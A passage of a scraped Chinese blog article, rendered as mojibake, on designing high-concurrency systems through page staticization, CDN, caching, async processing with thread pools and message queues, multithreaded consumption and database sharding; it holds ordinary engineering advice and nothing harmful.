                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ€è¿‘æœ‰ä½ç²‰ä¸é—®äº†æˆ‘ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜å¹¶å‘ç³»ç»Ÿï¼Ÿ</p>
<p>è¿™æ˜¯ä¸€ä¸ªéå¸¸é«˜é¢‘çš„é¢è¯•é¢˜ï¼Œé¢è¯•å®˜å¯ä»¥ä»å¤šä¸ªè§’åº¦ï¼Œè€ƒæŸ¥æŠ€æœ¯çš„å¹¿åº¦å’Œæ·±åº¦ã€‚</p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« è·Ÿå¤§å®¶ä¸€èµ·èŠèŠé«˜å¹¶å‘ç³»ç»Ÿè®¾è®¡ä¸€äº›å…³é”®ç‚¹ï¼Œå¸Œæœ›å¯¹ä½ ä¼šæœ‰æ‰€å¸®åŠ©ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20a181f94d93419e8a1aa6a302aa2df2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=9700iDX3nCDi8r18OcXmH%2FhgIVs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">1 é¡µé¢é™æ€åŒ–</h2>
<p>å¯¹äºé«˜å¹¶å‘ç³»ç»Ÿçš„é¡µé¢åŠŸèƒ½ï¼Œæˆ‘ä»¬å¿…é¡»è¦åš<code>é™æ€åŒ–</code>è®¾è®¡ã€‚</p>
<p>å¦‚æœå¹¶å‘è®¿é—®ç³»ç»Ÿçš„ç”¨æˆ·éå¸¸å¤šï¼Œæ¯æ¬¡ç”¨æˆ·è®¿é—®é¡µé¢çš„æ—¶å€™ï¼Œéƒ½é€šè¿‡æœåŠ¡å™¨åŠ¨æ€æ¸²æŸ“ï¼Œä¼šå¯¼è‡´æœåŠ¡ç«¯æ‰¿å—è¿‡å¤§çš„å‹åŠ›ï¼Œè€Œå¯¼è‡´é¡µé¢æ— æ³•æ­£å¸¸åŠ è½½çš„æƒ…å†µå‘ç”Ÿã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>Freemarker</code>æˆ–<code>Velocity</code>æ¨¡æ¿å¼•æ“ï¼Œå®ç°é¡µé¢é™æ€åŒ–åŠŸèƒ½ã€‚</p>
<p>ä»¥å•†åŸå®˜ç½‘é¦–é¡µä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>Job</code>ä¸­ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´ï¼ŒæŸ¥è¯¢å‡ºæ‰€æœ‰éœ€è¦åœ¨é¦–é¡µå±•ç¤ºçš„æ•°æ®ï¼Œæ±‡æ€»åˆ°ä¸€èµ·ï¼Œä½¿ç”¨æ¨¡æ¿å¼•æ“ç”Ÿæˆåˆ°htmlæ–‡ä»¶å½“ä¸­ã€‚</p>
<p>ç„¶åå°†è¯¥<code>html</code>æ–‡ä»¶ï¼Œé€šè¿‡<code>shell</code>è„šæœ¬ï¼Œè‡ªåŠ¨åŒæ­¥åˆ°å‰ç«¯é¡µé¢ç›¸å…³çš„æœåŠ¡å™¨ä¸Šã€‚</p>
<h2 data-id="heading-2">2 CSDNåŠ é€Ÿ</h2>
<p>è™½è¯´é¡µé¢é™æ€åŒ–å¯ä»¥æå‡ç½‘ç«™ç½‘é¡µçš„è®¿é—®é€Ÿåº¦ï¼Œä½†è¿˜ä¸å¤Ÿï¼Œå› ä¸ºç”¨æˆ·åˆ†å¸ƒåœ¨å…¨å›½å„åœ°ï¼Œæœ‰äº›äººåœ¨åŒ—äº¬ï¼Œæœ‰äº›äººåœ¨æˆéƒ½ï¼Œæœ‰äº›äººåœ¨æ·±åœ³ï¼Œåœ°åŸŸç›¸å·®å¾ˆè¿œï¼Œä»–ä»¬è®¿é—®ç½‘ç«™çš„ç½‘é€Ÿå„ä¸ç›¸åŒã€‚</p>
<p>å¦‚ä½•æ‰èƒ½è®©ç”¨æˆ·æœ€å¿«è®¿é—®åˆ°æ´»åŠ¨é¡µé¢å‘¢ï¼Ÿ</p>
<p>è¿™å°±éœ€è¦ä½¿ç”¨CDNï¼Œå®ƒçš„å…¨ç§°æ˜¯Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e24948221f344ddb0ee11bf4bc24f97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=lkUWnHnvcPvRnNeuwmttGgwh2WI%3D" alt="" loading="lazy"/>
ä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚</p>
<p>CDNåŠ é€Ÿçš„åŸºæœ¬åŸç†æ˜¯ï¼šå°†ç½‘ç«™çš„é™æ€å†…å®¹ï¼ˆå¦‚å›¾ç‰‡ã€CSSã€JavaScriptæ–‡ä»¶ç­‰ï¼‰å¤åˆ¶å¹¶å­˜å‚¨åˆ°åˆ†å¸ƒåœ¨å…¨çƒå„åœ°çš„æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šã€‚</p>
<p>å½“ç”¨æˆ·è¯·æ±‚è®¿é—®ç½‘ç«™æ—¶ï¼ŒCDNç³»ç»Ÿä¼šæ ¹æ®ç”¨æˆ·çš„åœ°ç†ä½ç½®ï¼Œè‡ªåŠ¨å°†å†…å®¹åˆ†å‘ç»™ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡å™¨ï¼Œä»è€Œå®ç°å¿«é€Ÿè®¿é—®ã€‚</p>
<p>å›½å†…å¸¸è§çš„CDNæä¾›å•†æœ‰é˜¿é‡Œäº‘CDNã€è…¾è®¯äº‘CDNã€ç™¾åº¦äº‘åŠ é€Ÿç­‰ï¼Œå®ƒä»¬æä¾›äº†å…¨çƒåˆ†å¸ƒçš„èŠ‚ç‚¹æœåŠ¡å™¨ï¼Œä¸ºå…¨çƒèŒƒå›´å†…çš„ç½‘ç«™åŠ é€ŸæœåŠ¡ã€‚</p>
<h2 data-id="heading-3">3 ç¼“å­˜</h2>
<p>åœ¨é«˜å¹¶å‘çš„ç³»ç»Ÿä¸­ï¼Œ<code>ç¼“å­˜</code>å¯ä»¥è¯´æ˜¯å¿…ä¸å¯å°‘çš„æŠ€æœ¯ä¹‹ä¸€ã€‚</p>
<p>ç›®å‰ç¼“å­˜æœ‰ä¸¤ç§ï¼š</p>
<ol>
<li>åŸºäºåº”ç”¨æœåŠ¡å™¨çš„å†…å­˜ç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„äºŒçº§ç¼“å­˜ã€‚</li>
<li>ä½¿ç”¨ç¼“å­˜ä¸­é—´ä»¶ï¼Œæ¯”å¦‚ï¼šRedisã€Memcachedç­‰ï¼Œè¿™ç§æ˜¯åˆ†å¸ƒå¼ç¼“å­˜ã€‚</li>
</ol>
<p>è¿™ä¸¤ç§ç¼“å­˜å„æœ‰ä¼˜ç¼ºç‚¹ã€‚</p>
<p>äºŒçº§ç¼“å­˜çš„æ€§èƒ½æ›´å¥½ï¼Œä½†å› ä¸ºæ˜¯åŸºäºåº”ç”¨æœåŠ¡å™¨å†…å­˜çš„ç¼“å­˜ï¼Œå¦‚æœç³»ç»Ÿéƒ¨ç½²åˆ°äº†å¤šä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šå­˜åœ¨æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µã€‚</p>
<p>è€ŒRedisæˆ–Memcachedè™½è¯´æ€§èƒ½ä¸Šæ¯”ä¸ä¸ŠäºŒçº§ç¼“å­˜ï¼Œä½†å®ƒä»¬æ˜¯åˆ†å¸ƒå¼ç¼“å­˜ï¼Œé¿å…å¤šä¸ªæœåŠ¡å™¨èŠ‚ç‚¹æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚</p>
<p>ç¼“å­˜çš„ç”¨æ³•ä¸€èˆ¬æ˜¯è¿™æ ·çš„ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/081cb7c9af54498b93983450df9c774c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=MsgwajBcLzR2HZ8Y6C%2BHdyuhuvE%3D" alt="" loading="lazy"/>
ä½¿ç”¨ç¼“å­˜ä¹‹åï¼Œå¯ä»¥å‡è½»è®¿é—®æ•°æ®åº“çš„å‹åŠ›ï¼Œæ˜¾è‘—çš„æå‡ç³»ç»Ÿçš„æ€§èƒ½ã€‚</p>
<p>æœ‰äº›ä¸šåŠ¡åœºæ™¯ï¼Œç”šè‡³ä¼šåˆ†å¸ƒå¼ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜ä¸€èµ·ä½¿ç”¨ã€‚</p>
<p>æ¯”å¦‚è·å–å•†å“åˆ†ç±»æ•°æ®ï¼Œæµç¨‹å¦‚ä¸‹ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3430577b05147db86099773dd93463c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=RSFWKvmcvbWH8k7EnvJz9rqXioY%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡å¼•å…¥ç¼“å­˜ï¼Œè™½è¯´ç»™æˆ‘ä»¬çš„ç³»ç»Ÿæ€§èƒ½å¸¦æ¥äº†æå‡ï¼Œä½†åŒæ—¶ä¹Ÿç»™æˆ‘ä»¬å¸¦æ¥äº†ä¸€äº›æ–°çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼šã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247493521%26idx%3D1%26sn%3Dbff84e7a819d79e4b8eb7e722e96ddfc%26chksm%3Dc0e83f79f79fb66f2e7bf03a104580b404ea0a3c977846e428f13c1f12fbad46d4d778b2da14%26token%3D902535653%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247493521&amp;idx=1&amp;sn=bff84e7a819d79e4b8eb7e722e96ddfc&amp;chksm=c0e83f79f79fb66f2e7bf03a104580b404ea0a3c977846e428f13c1f12fbad46d4d778b2da14&amp;token=902535653&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">æ•°æ®åº“å’Œç¼“å­˜åŒå‘æ•°æ®åº“ä¸€è‡´æ€§é—®é¢˜</a>ã€‹ã€ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247491225%26idx%3D1%26sn%3Dbfb14f28911efaa6e3a615870fff9a5c%26chksm%3Dc0ebc671f79c4f6718a63bbec91d79a4b05e1dd2a7c00ed9bf6a9f582abd4c6e5c870148ff89%26token%3D902535653%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247491225&amp;idx=1&amp;sn=bfb14f28911efaa6e3a615870fff9a5c&amp;chksm=c0ebc671f79c4f6718a63bbec91d79a4b05e1dd2a7c00ed9bf6a9f582abd4c6e5c870148ff89&amp;token=902535653&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">ç¼“å­˜ç©¿é€ã€å‡»ç©¿å’Œé›ªå´©é—®é¢˜</a>ã€‹ç­‰ã€‚</p>
<p>æˆ‘ä»¬åœ¨ä½¿ç”¨ç¼“å­˜æ—¶ï¼Œä¸€å®šè¦ç»“åˆå®é™…ä¸šåŠ¡åœºæ™¯ï¼Œåˆ‡è®°ä¸è¦ä¸ºäº†ç¼“å­˜è€Œç¼“å­˜ã€‚</p>
<h2 data-id="heading-4">4 å¼‚æ­¥</h2>
<p>æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨é«˜å¹¶å‘ç³»ç»Ÿå½“ä¸­ï¼ŒæŸäº›æ¥å£çš„ä¸šåŠ¡é€»è¾‘ï¼Œæ²¡å¿…è¦éƒ½åŒæ­¥æ‰§è¡Œã€‚</p>
<p>æ¯”å¦‚æœ‰ä¸ªç”¨æˆ·è¯·æ±‚æ¥å£ä¸­ï¼Œéœ€è¦åšä¸šåŠ¡æ“ä½œï¼Œå‘ç«™å†…é€šçŸ¥ï¼Œå’Œè®°å½•æ“ä½œæ—¥å¿—ã€‚ä¸ºäº†å®ç°èµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šå°†è¿™äº›é€»è¾‘æ”¾åœ¨æ¥å£ä¸­åŒæ­¥æ‰§è¡Œï¼ŒåŠ¿å¿…ä¼šå¯¹æ¥å£æ€§èƒ½é€ æˆä¸€å®šçš„å½±å“ã€‚</p>
<p>æ¥å£å†…éƒ¨æµç¨‹å›¾å¦‚ä¸‹ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/239e42718536497c86a0c2262325cc22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=ZaMeWPKsYCxr0P7pXSoZxY1ZeI8%3D" alt="" loading="lazy"/>
è¿™ä¸ªæ¥å£è¡¨é¢ä¸Šçœ‹èµ·æ¥æ²¡æœ‰é—®é¢˜ï¼Œä½†å¦‚æœä½ ä»”ç»†æ¢³ç†ä¸€ä¸‹ä¸šåŠ¡é€»è¾‘ï¼Œä¼šå‘ç°åªæœ‰ä¸šåŠ¡æ“ä½œæ‰æ˜¯æ ¸å¿ƒé€»è¾‘ï¼Œå…¶ä»–çš„åŠŸèƒ½éƒ½æ˜¯éæ ¸å¿ƒé€»è¾‘ã€‚</p>
<p>åœ¨è¿™é‡Œæœ‰ä¸ªåŸåˆ™å°±æ˜¯ï¼šæ ¸å¿ƒé€»è¾‘å¯ä»¥åŒæ­¥æ‰§è¡Œï¼ŒåŒæ­¥å†™åº“ã€‚éæ ¸å¿ƒé€»è¾‘ï¼Œå¯ä»¥å¼‚æ­¥æ‰§è¡Œï¼Œå¼‚æ­¥å†™åº“ã€‚</p>
<p>ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œå‘ç«™å†…é€šçŸ¥å’Œç”¨æˆ·æ“ä½œæ—¥å¿—åŠŸèƒ½ï¼Œå¯¹å®æ—¶æ€§è¦æ±‚ä¸é«˜ï¼Œå³ä½¿æ™šç‚¹å†™åº“ï¼Œç”¨æˆ·æ— éæ˜¯æ™šç‚¹æ”¶åˆ°ç«™å†…é€šçŸ¥ï¼Œæˆ–è€…è¿è¥æ™šç‚¹çœ‹åˆ°ç”¨æˆ·æ“ä½œæ—¥å¿—ï¼Œå¯¹ä¸šåŠ¡å½±å“ä¸å¤§ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥å¼‚æ­¥å¤„ç†ã€‚</p>
<p>é€šå¸¸å¼‚æ­¥ä¸»è¦æœ‰ä¸¤ç§ï¼šå¤šçº¿ç¨‹ å’Œ mqã€‚</p>
<h3 data-id="heading-5">4.1 çº¿ç¨‹æ± </h3>
<p>ä½¿ç”¨çº¿ç¨‹æ± æ”¹é€ ä¹‹åï¼Œæ¥å£é€»è¾‘å¦‚ä¸‹ï¼š<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74719e35c5b34a7ba566aea438dfa9fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=7Lwc6BIeomi3SR%2BY3TuLYD8ulmk%3D" alt="" loading="lazy"/>å‘ç«™å†…é€šçŸ¥å’Œç”¨æˆ·æ“ä½œæ—¥å¿—åŠŸèƒ½ï¼Œè¢«æäº¤åˆ°äº†ä¸¤ä¸ªå•ç‹¬çš„çº¿ç¨‹æ± ä¸­ã€‚</p>
<p>è¿™æ ·æ¥å£ä¸­é‡ç‚¹å…³æ³¨çš„æ˜¯ä¸šåŠ¡æ“ä½œï¼ŒæŠŠå…¶ä»–çš„é€»è¾‘äº¤ç»™çº¿ç¨‹å¼‚æ­¥æ‰§è¡Œï¼Œè¿™æ ·æ”¹é€ ä¹‹åï¼Œè®©æ¥å£æ€§èƒ½ç¬é—´æå‡äº†ã€‚</p>
<p>ä½†ä½¿ç”¨çº¿ç¨‹æ± æœ‰ä¸ªå°é—®é¢˜å°±æ˜¯ï¼šå¦‚æœæœåŠ¡å™¨é‡å¯äº†ï¼Œæˆ–è€…æ˜¯éœ€è¦è¢«æ‰§è¡Œçš„åŠŸèƒ½å‡ºç°å¼‚å¸¸äº†ï¼Œæ— æ³•é‡è¯•ï¼Œä¼šä¸¢æ•°æ®ã€‚</p>
<p>é‚£ä¹ˆè¿™ä¸ªé—®é¢˜è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<h3 data-id="heading-6">4.2 mq</h3>
<p>ä½¿ç”¨mqæ”¹é€ ä¹‹åï¼Œæ¥å£é€»è¾‘å¦‚ä¸‹ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd663e1e95fd4bcab15e153684b30892~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=BrPJfQVyRwI1CYXZPRYnxCZxaWw%3D" alt="" loading="lazy"/>
å¯¹äºå‘ç«™å†…é€šçŸ¥å’Œç”¨æˆ·æ“ä½œæ—¥å¿—åŠŸèƒ½ï¼Œåœ¨æ¥å£ä¸­å¹¶æ²¡çœŸæ­£å®ç°ï¼Œå®ƒåªå‘é€äº†mqæ¶ˆæ¯åˆ°mqæœåŠ¡å™¨ã€‚ç„¶åç”±mqæ¶ˆè´¹è€…æ¶ˆè´¹æ¶ˆæ¯æ—¶ï¼Œæ‰çœŸæ­£çš„æ‰§è¡Œè¿™ä¸¤ä¸ªåŠŸèƒ½ã€‚</p>
<p>è¿™æ ·æ”¹é€ ä¹‹åï¼Œæ¥å£æ€§èƒ½åŒæ ·æå‡äº†ï¼Œå› ä¸ºå‘é€mqæ¶ˆæ¯é€Ÿåº¦æ˜¯å¾ˆå¿«çš„ï¼Œæˆ‘ä»¬åªéœ€å…³æ³¨ä¸šåŠ¡æ“ä½œçš„ä»£ç å³å¯ã€‚</p>
<h2 data-id="heading-7">5 å¤šçº¿ç¨‹å¤„ç†</h2>
<p>åœ¨é«˜å¹¶å‘ç³»ç»Ÿå½“ä¸­ï¼Œç”¨æˆ·çš„è¯·æ±‚é‡å¾ˆå¤§ã€‚</p>
<p>å‡å¦‚æˆ‘ä»¬ç°åœ¨ç”¨mqå¤„ç†ä¸šåŠ¡é€»è¾‘ã€‚</p>
<p>ä¸€ä¸‹å­æœ‰å¤§é‡çš„ç”¨æˆ·è¯·æ±‚ï¼Œäº§ç”Ÿäº†å¤§é‡çš„mqæ¶ˆæ¯ï¼Œä¿å­˜åˆ°äº†mqæœåŠ¡å™¨ã€‚</p>
<p>è€Œmqçš„æ¶ˆè´¹è€…ï¼Œæ¶ˆè´¹é€Ÿåº¦å¾ˆæ…¢ã€‚</p>
<p>å¯èƒ½ä¼šå¯¼è‡´å¤§é‡çš„æ¶ˆæ¯ç§¯å‹é—®é¢˜ã€‚</p>
<p>ä»è€Œä¸¥é‡å½±å“æ•°æ®çš„å®æ—¶æ€§ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦å¯¹æ¶ˆæ¯çš„æ¶ˆè´¹è€…åšä¼˜åŒ–ã€‚</p>
<p>æœ€å¿«çš„æ–¹å¼æ˜¯ä½¿ç”¨<code>å¤šçº¿ç¨‹</code>æ¶ˆè´¹æ¶ˆæ¯ï¼Œæ¯”å¦‚ï¼šæ”¹æˆçº¿ç¨‹æ± æ¶ˆè´¹æ¶ˆæ¯ã€‚</p>
<p>å½“ç„¶æ ¸å¿ƒçº¿ç¨‹æ•°ã€æœ€å¤§çº¿ç¨‹æ•°ã€é˜Ÿåˆ—å¤§å° å’Œ çº¿ç¨‹å›æ”¶æ—¶é—´ï¼Œä¸€å®šè¦åšæˆé…ç½®çš„ï¼Œåé¢å¯ä»¥æ ¹æ®å®é™…æƒ…å†µåŠ¨æ€è°ƒæ•´ã€‚</p>
<p>è¿™æ ·æ”¹é€ ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿè§£å†³æ¶ˆæ¯ç§¯å‹é—®é¢˜ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨å¾ˆå¤šæ•°æ®å¯¼å…¥åœºæ™¯ï¼Œç”¨å¤šçº¿ç¨‹å¯¼å…¥æ•°æ®ï¼Œå¯ä»¥æå‡æ•ˆç‡ã€‚</p>
<blockquote>
<p>æ¸©é¦¨æé†’ä¸€ä¸‹ï¼šä½¿ç”¨å¤šçº¿ç¨‹æ¶ˆè´¹æ¶ˆæ¯ï¼Œå¯èƒ½ä¼šå‡ºç°æ¶ˆæ¯çš„é¡ºåºé—®é¢˜ã€‚å¦‚æœä½ çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œéœ€è¦ä¿è¯æ¶ˆæ¯çš„é¡ºåºï¼Œåˆ™è¦ç”¨å…¶ä»–çš„æ–¹å¼è§£å†³é—®é¢˜ã€‚æ„Ÿå…´è¶£çš„å°ä¼™ä¼´ï¼Œå¯ä»¥æ‰¾æˆ‘ç§èŠã€‚</p>
</blockquote>
<h2 data-id="heading-8">6 åˆ†åº“åˆ†è¡¨</h2>
<p>æœ‰æ—¶å€™ï¼Œé«˜å¹¶å‘ç³»ç»Ÿçš„ååé‡å—é™çš„ä¸æ˜¯åˆ«çš„ï¼Œè€Œæ˜¯æ•°æ®åº“ã€‚</p>
<p>å½“ç³»ç»Ÿå‘å±•åˆ°ä¸€å®šçš„é˜¶æ®µï¼Œç”¨æˆ·å¹¶å‘é‡å¤§ï¼Œä¼šæœ‰å¤§é‡çš„æ•°æ®åº“è¯·æ±‚ï¼Œéœ€è¦å ç”¨å¤§é‡çš„æ•°æ®åº“è¿æ¥ï¼ŒåŒæ—¶ä¼šå¸¦æ¥ç£ç›˜IOçš„æ€§èƒ½ç“¶é¢ˆé—®é¢˜ã€‚</p>
<p>æ­¤å¤–ï¼Œéšç€ç”¨æˆ·æ•°é‡è¶Šæ¥è¶Šå¤šï¼Œäº§ç”Ÿçš„æ•°æ®ä¹Ÿè¶Šæ¥è¶Šå¤šï¼Œä¸€å¼ è¡¨æœ‰å¯èƒ½å­˜ä¸ä¸‹ã€‚ç”±äºæ•°æ®é‡å¤ªå¤§ï¼Œsqlè¯­å¥æŸ¥è¯¢æ•°æ®æ—¶ï¼Œå³ä½¿èµ°äº†ç´¢å¼•ä¹Ÿä¼šéå¸¸è€—æ—¶ã€‚</p>
<p>è¿™æ—¶è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>ç­”ï¼šéœ€è¦åš<code>åˆ†åº“åˆ†è¡¨</code>ã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a530fde9284a47e2bff9db2fa98e0a73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=69KBLhtiOSFWD8DwP7P4pQDPZF0%3D" alt="" loading="lazy"/>
å›¾ä¸­å°†ç”¨æˆ·åº“æ‹†åˆ†æˆäº†ä¸‰ä¸ªåº“ï¼Œæ¯ä¸ªåº“éƒ½åŒ…å«äº†å››å¼ ç”¨æˆ·è¡¨ã€‚</p>
<p>å¦‚æœæœ‰ç”¨æˆ·è¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œå…ˆæ ¹æ®ç”¨æˆ·idè·¯ç”±åˆ°å…¶ä¸­ä¸€ä¸ªç”¨æˆ·åº“ï¼Œç„¶åå†å®šä½åˆ°æŸå¼ è¡¨ã€‚</p>
<p>è·¯ç”±çš„ç®—æ³•æŒºå¤šçš„ï¼š</p>
<ul>
<li>æ ¹æ®idå–æ¨¡ï¼Œæ¯”å¦‚ï¼šid=7ï¼Œæœ‰4å¼ è¡¨ï¼Œåˆ™7%4=3ï¼Œæ¨¡ä¸º3ï¼Œè·¯ç”±åˆ°ç”¨æˆ·è¡¨3ã€‚</li>
